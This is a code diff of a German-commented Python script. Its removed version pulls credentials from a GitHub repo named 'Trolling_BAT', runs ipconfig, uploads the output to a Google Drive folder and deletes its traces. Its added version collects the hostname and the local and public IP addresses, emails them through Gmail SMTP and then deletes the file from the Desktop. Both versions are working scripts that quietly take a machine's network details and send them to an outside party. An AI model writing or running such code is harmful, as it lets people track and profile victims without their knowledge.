@@ -1,79 +1,60 @@
+import smtplib
 import os
 import time
+import socket
 import requests
-import subprocess
-import sys
-import google.auth.transport.requests
-from google.oauth2 import service_account
-from googleapiclient.discovery import build
-from googleapiclient.http import MediaFileUpload
+from email.message import EmailMessage
 
-CREDENTIALS_URL = "https://raw.githubusercontent.com/MangoTheSherlock/Trolling_BAT/main/credentials.json"
-CREDENTIALS_FILE = "credentials.json"
-
-def download_credentials():
-    response = requests.get(CREDENTIALS_URL)
-    if response.status_code == 200:
-        with open(CREDENTIALS_FILE, "wb") as f:
-            f.write(response.content)
-    else:
-        sys.exit(1)
-
-download_credentials()
-
-OUTPUT_FILE = "output.txt"
-
-with open(OUTPUT_FILE, "w") as f:
-    process = subprocess.run(["ipconfig"], stdout=f, text=True, shell=True)
-
-f.close()
-time.sleep(1)
-
-SCOPES = ["https://www.googleapis.com/auth/drive.file"]
-creds = service_account.Credentials.from_service_account_file(CREDENTIALS_FILE, scopes=SCOPES)
-
-request = google.auth.transport.requests.Request()
-creds.refresh(request)
-
-service = build("drive", "v3", credentials=creds)
-
-FOLDER_ID = "1zLRe3Kq1x4FDB5khIUTHaHMA9-feiHRf"
-
-file_metadata = {"name": OUTPUT_FILE, "parents": [FOLDER_ID]}
-media = MediaFileUpload(OUTPUT_FILE, mimetype="text/plain", resumable=False)
-
-upload_successful = False
-max_retries = 5
-for attempt in range(max_retries):
+# 🔹 1. Eigene IP-Adresse ermitteln
+def get_ip():
     try:
-        uploaded_file = service.files().create(body=file_metadata, media_body=media, fields="id").execute()
-        upload_successful = True
-        print(f"Datei erfolgreich hochgeladen: ID {uploaded_file['id']}")
-        break
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)  # Lokale IP
+        public_ip = requests.get("https://api64.ipify.org").text  # Öffentliche IP
+        return hostname, local_ip, public_ip
     except Exception as e:
-        print(f"Fehler beim Hochladen (Versuch {attempt+1}/{max_retries}): {e}")
-        time.sleep(2 ** attempt)
+        return "Fehler", "Nicht gefunden", str(e)
 
-if not upload_successful:
-    sys.exit(1)
+hostname, local_ip, public_ip = get_ip()
 
-time.sleep(2)
+# 🔹 2. Datei erstellen
+file_path = os.path.expanduser("~/Desktop/output.txt")  # Datei auf dem Desktop
+file_name = "output.txt"
 
-def safe_delete(file):
-    try:
-        if os.path.exists(file):
-            os.chmod(file, 0o777)
-            with open(file, "w") as f:
-                f.close()
-            time.sleep(1)
-            os.remove(file)
-            print(f"{file} wurde erfolgreich gelöscht.")
-        else:
-            print(f"{file} nicht gefunden.")
-    except Exception as e:
-        print(f"Fehler beim Löschen von {file}: {e}")
+with open(file_path, "w") as file:
+    file.write(f"Hostname: {hostname}\n")
+    file.write(f"Lokale IP: {local_ip}\n")
+    file.write(f"Öffentliche IP: {public_ip}\n")
+    file.write(f"Erstellt am: {time.ctime()}\n")
 
-safe_delete(OUTPUT_FILE)
-safe_delete(CREDENTIALS_FILE)
+print(f"📄 Datei '{file_name}' wurde erstellt!")
 
-sys.exit(0)
+# 🔹 3. E-Mail-Daten einrichten
+EMAIL_ABSENDER = "deine_email@gmail.com"   # <== Deine E-Mail hier eintragen
+EMAIL_PASSWORT = "dein_app_passwort"       # <== App-Passwort hier eintragen
+EMAIL_EMPFAENGER = "empfaenger_email@gmail.com"  # <== Empfänger-E-Mail hier eintragen
+
+# 🔹 4. E-Mail mit Anhang senden
+msg = EmailMessage()
+msg["Subject"] = "IP-Informationen"
+msg["From"] = EMAIL_ABSENDER
+msg["To"] = EMAIL_EMPFAENGER
+msg.set_content("Hier ist die Datei mit den IP-Informationen.")
+
+# Datei als Anhang hinzufügen
+with open(file_path, "rb") as file:
+    msg.add_attachment(file.read(), maintype="text", subtype="plain", filename=file_name)
+
+try:
+    # SMTP-Server verbinden (Google SMTP)
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+        server.login(EMAIL_ABSENDER, EMAIL_PASSWORT)
+        server.send_message(msg)
+    
+    print("✅ E-Mail mit Anhang erfolgreich gesendet!")
+except Exception as e:
+    print(f"❌ Fehler beim Senden der E-Mail: {e}")
+
+# 🔹 5. Datei vom Desktop löschen
+os.remove(file_path)
+print(f"🗑️ Datei '{file_name}' wurde vom Desktop gelöscht!")
